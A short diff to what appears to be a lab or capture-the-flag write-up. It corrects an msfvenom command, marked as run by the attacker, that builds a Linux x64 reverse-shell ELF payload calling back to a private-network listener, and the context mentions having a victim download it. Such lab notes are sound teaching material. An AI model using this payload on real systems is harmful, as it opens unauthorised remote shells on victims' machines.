@@ -97,7 +97,8 @@ up on a webpage and the downloading it from victim.
 
 Exploiting arper utullizing msfvenom as a reverse shell.
 
-(ATTACKER) msfvenom-p linux/x64/shell/reverse_tcp LHOST=192.168.122.209 LPORT=61775 -f elf -o mal
+(ATTACKER) msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.122.209 
+LPORT=61775 -f elf -o mal
 (ATTACKER) sudo rm -r__MACosx
 (ATTACKER) sudo rm -r 48*
 (ATTACKER) ls 
